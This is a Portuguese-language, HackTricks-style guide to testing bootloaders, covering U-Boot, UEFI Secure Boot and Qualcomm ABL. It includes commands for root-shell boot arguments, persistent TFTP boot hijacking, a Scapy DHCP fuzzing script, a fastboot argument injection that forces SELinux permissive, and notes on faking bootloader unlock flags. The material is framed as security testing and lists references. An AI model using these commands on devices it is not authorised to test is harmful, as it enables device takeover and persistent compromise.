# Teste do Bootloader

{{#include ../../banners/hacktricks-training.md}}

As etapas a seguir são recomendadas para modificar configurações de inicialização do dispositivo e testar bootloaders como U-Boot e loaders da classe UEFI. Concentre-se em obter execução de código antecipada, avaliar proteções de assinatura/rollback e abusar de caminhos de recovery ou network-boot.

Relacionado: bypass de secure-boot do MediaTek via patching de bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Quick wins do U-Boot e abuso do environment

1. Acesse o shell do interpretador
- Durante o boot, pressione uma tecla de interrupção conhecida (geralmente qualquer tecla, 0, espaço ou uma sequência "mágica" específica da placa) antes que `bootcmd` seja executado para acessar o prompt do U-Boot.<sup>[[1]](#references)</sup>

2. Inspecione o estado do boot e as variáveis
- Comandos úteis:
- `printenv` (exibe o environment)
- `bdinfo` (informações da placa, endereços de memória)
- `help bootm; help booti; help bootz` (métodos de boot de kernel suportados)
- `help ext4load; help fatload; help tftpboot` (loaders disponíveis)

3. Modifique os argumentos de boot para obter um root shell
- Adicione `init=/bin/sh` para que o kernel acesse um shell em vez do init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # ou: run bootcmd
```

4. Faça netboot a partir do seu servidor TFTP
- Configure a rede e obtenha um kernel/fit image da LAN:
```
# setenv ipaddr 192.168.2.2      # IP do dispositivo
# setenv serverip 192.168.2.1    # IP do servidor TFTP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persista alterações via environment
- Se o armazenamento do env não estiver protegido contra escrita, você poderá persistir o controle:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Verifique variáveis como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influenciam os caminhos de fallback. Valores configurados incorretamente podem permitir interrupções repetidas para acessar o shell.

6. Verifique recursos de debug/inseguros
- Procure por: `bootdelay` > 0, `autoboot` desabilitado, `usb start; fatload usb 0:1 ...` sem restrições, capacidade de usar `loady`/`loads` via serial, `env import` a partir de mídia não confiável e kernels/ramdisks carregados sem verificações de assinatura.

7. Teste de image/verificação do U-Boot
- Se a plataforma declara usar secure/verified boot com FIT images, tente usar images não assinadas e adulteradas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # deve FALHAR se a assinatura FIT for obrigatória
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # deve FALHAR
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # só deve iniciar se a key for confiável
```
- A ausência de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou o comportamento legado `verify=n` frequentemente permite iniciar payloads arbitrários.
- Não pare em um simples resultado de permitido/negado: pesquisas recentes sobre FIT demonstraram que o próprio caminho de verificação pode ser uma attack surface pré-auth. Faça negative testing de dados FIT armazenados externamente (`data-offset`, `data-position`, `data-size`), seleção de configurações assinadas, `loadables` e tratamento de overlay / `extra-conf`.
- Se você tiver uma source tree correspondente, `test/vboot/vboot_test.sh` é uma forma rápida de reproduzir o comportamento de verificação FIT no U-Boot sandbox antes de tocar no hardware real.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` e script bootflows
- Em builds modernos do U-Boot, `bootcmd` geralmente é apenas um wrapper em torno do Standard Boot. Isso significa que mídias graváveis, PXE ou SPI flash podem se tornar a verdadeira trust boundary, mesmo quando o environment visível parece inofensivo.
- O `bootmeth` do `extlinux` procura `extlinux/extlinux.conf` em `/` e `/boot`; o `bootmeth` de script procura primeiro `boot.scr.uimg` e depois `boot.scr`. No network boot, o nome do script pode vir de `boot_script_dhcp`.
- Comandos úteis:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Casos de abuso a testar: mídia USB/SD controlada pelo atacante antes em `boot_targets`, `/boot/extlinux/extlinux.conf` gravável, TFTP rogue fornecendo `boot.scr` ou execução de scripts apoiada por SPI via `script_offset_f`.
- Se a plataforma depender da verificação FIT, certifique-se de que as configurações sejam assinadas no nível da configuração, e não apenas por image; `required-mode=all` é mais forte do que aceitar qualquer uma das keys obrigatórias.

## Attack surface de network-boot (DHCP/PXE) e servidores rogue

9. Fuzzing de parâmetros PXE/DHCP
- O tratamento legado de BOOTP/DHCP do U-Boot já apresentou problemas de memory-safety. Por exemplo, CVE‑2024‑42040 descreve memory disclosure por meio de respostas DHCP criadas para esse fim, que podem causar leak de bytes da memória do U-Boot de volta pela rede.<sup>[[4]](#references)</sup> Exercite os caminhos de código DHCP/PXE com valores excessivamente longos e de casos extremos (option 67 bootfile-name, vendor options, campos file/servername) e observe travamentos/leaks.
- Snippet mínimo de Scapy para estressar parâmetros de boot durante o netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Valores intencionalmente grandes e incomuns
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valide também se os campos de nome de arquivo PXE são passados à lógica do shell/loader sem sanitização quando encadeados a scripts de provisioning no lado do OS.

10. Teste de command injection em rogue DHCP server
- Configure um serviço rogue DHCP/PXE e tente injetar caracteres nos campos de nome de arquivo ou options para alcançar command interpreters em estágios posteriores da cadeia de boot. O auxiliary de DHCP do Metasploit, `dnsmasq` ou scripts Scapy personalizados funcionam bem. Certifique-se de isolar a rede do lab primeiro.

## Modos de recovery da SoC ROM que substituem o boot normal

Muitas SoCs expõem um modo "loader" de BootROM que aceita código via USB/UART mesmo quando as flash images são inválidas. Se os secure-boot fuses não estiverem gravados, isso pode fornecer execução arbitrária de código muito cedo na cadeia.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) ou `imx-usb-loader`.
- Exemplo: `imx-usb-loader u-boot.imx` para enviar e executar um U-Boot customizado a partir da RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Exemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Exemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para preparar um loader e fazer upload de um U-Boot customizado.

Avalie se o dispositivo possui eFuses/OTP de secure-boot gravados. Caso contrário, os modos de download da BootROM frequentemente ignoram qualquer verificação de nível superior (U-Boot, kernel, rootfs), executando seu payload de primeiro estágio diretamente da SRAM/DRAM.

## Bootloaders UEFI/da classe PC: verificações rápidas

11. Teste de adulteração da ESP, rollback e enrollment de keys
- Monte a EFI System Partition (ESP) e procure componentes do loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, caminhos de logos do vendor.
- Exiba o estado do Secure Boot e os bancos de keys a partir do OS quando possível:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Se a plataforma estiver em Setup Mode, aceitar enrollment de keys não autenticadas ou vier com uma Platform Key (PK) de teste/default (classe PKfail), um admin local ou atacante com acesso físico poderá registrar sua própria KEK/db e manter o Secure Boot aparentemente “habilitado” enquanto inicia EFI binaries arbitrários.<sup>[[3]](#references)</sup>
- Tente iniciar com boot components assinados downgraded ou conhecidos como vulneráveis caso as revogações do Secure Boot (dbx) não estejam atualizadas. Se a plataforma ainda confiar em shims/bootmanagers antigos, normalmente será possível carregar seu próprio kernel ou `grub.cfg` a partir da ESP para obter persistence.

12. Teste de revogação de shim / SBAT / dbx desatualizado
- Shims antigos assinados pela Microsoft e forks de vendors ainda podem atuar como um caminho de bootkit no estilo BYOVD se as revogações estiverem desatualizadas. Em um lab isolado, coloque um shim historicamente vulnerável na ESP e tente fazer chainload do seu próprio `grubx64.efi` ou kernel.<sup>[[11]](#references)</sup>
- Triage rápido:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Se o shim ainda executar apesar de estar na lista de revogação, o firmware/OS possui updates `dbx` desatualizados ou confia em um loader forked que nunca herdou as proteções SBAT upstream.

13. Bugs de parsing de boot logo (classe LogoFAIL)
- Vários firmwares de OEM/IBV eram vulneráveis a falhas de image-parsing em DXE que processam boot logos. Se um atacante puder colocar uma image criada especialmente na ESP em um caminho específico do vendor (por exemplo, `\EFI\<vendor>\logo\*.bmp`) e reiniciar, poderá ser possível obter execução de código durante o boot inicial mesmo com o Secure Boot habilitado. Teste se a plataforma aceita logos fornecidos pelo usuário e se esses caminhos são graváveis a partir do OS.<sup>[[2]](#references)</sup>


## Lacunas de trust do Android/Qualcomm ABL + GBL (Android 16)

Em dispositivos Android 16 que usam o ABL da Qualcomm para carregar a **Generic Bootloader Library (GBL)**, valide se o ABL **autentica** o UEFI app carregado a partir da partição `efisp`. Se o ABL verificar apenas a **presença** de um UEFI app e não verificar assinaturas, uma write primitive em `efisp` se torna **execução de código não assinado pré-OS** durante o boot.<sup>[[6]](#references)[[7]](#references)</sup>

Verificações práticas e caminhos de abuso:

- **write primitive em `efisp`**: É necessário ter uma forma de gravar um UEFI app customizado em `efisp` (root/serviço privilegiado, bug em OEM app, caminho de recovery/fastboot). Sem isso, a lacuna de carregamento do GBL não pode ser alcançada diretamente.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (bug do ABL): Alguns builds aceitam tokens adicionais em `fastboot oem set-gpu-preemption` e os adicionam à kernel cmdline. Isso pode ser usado para forçar um SELinux permissive, permitindo writes em partições protegidas:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Se o dispositivo estiver corrigido, o comando deverá rejeitar argumentos adicionais.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader unlock via flags persistentes**: Um payload no estágio de boot pode alterar flags persistentes de unlock (por exemplo, `is_unlocked=1`, `is_unlocked_critical=1`) para emular `fastboot oem unlock` sem as gates de servidor/aprovação do OEM. Essa é uma mudança de postura durável após o próximo reboot.<sup>[[6]](#references)</sup>

Notas defensivas/de triage:

- Confirme se o ABL realiza verificação de assinatura no payload GBL/UEFI vindo de `efisp`. Caso contrário, trate `efisp` como uma persistence surface de alto risco.
- Verifique se os handlers fastboot OEM do ABL foram corrigidos para **validar a quantidade de argumentos** e rejeitar tokens adicionais.<sup>[[8]](#references)[[9]](#references)</sup>

## Cuidado com o hardware

Tenha cuidado ao interagir com SPI/NAND flash durante o boot inicial (por exemplo, aterrando pinos para ignorar leituras) e sempre consulte o datasheet da flash. Curtos fora de tempo podem corromper o dispositivo ou o programmer.

## Notas e dicas adicionais

- Tente `env export -t ${loadaddr}` e `env import -t ${loadaddr}` para mover blobs de environment entre a RAM e o armazenamento; algumas plataformas permitem importar env de mídias removíveis sem autenticação.
- Para persistence em sistemas baseados em Linux que inicializam via `extlinux.conf`, modificar a linha `APPEND` (para injetar `init=/bin/sh` ou `rd.break`) na partição de boot geralmente é suficiente quando nenhuma verificação de assinatura é aplicada.
- Se o target usar updates dual-slot / A/B, revise as técnicas de anti-rollback e slot-desync no [firmware analysis overview](README.md) para não perder trust gaps exclusivos do updater fora do próprio bootloader.
- Se o userland fornecer `fw_printenv/fw_setenv`, valide se `/etc/fw_env.config` corresponde ao armazenamento real do env. Offsets configurados incorretamente permitem ler/gravar a região MTD errada.

## Referências

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
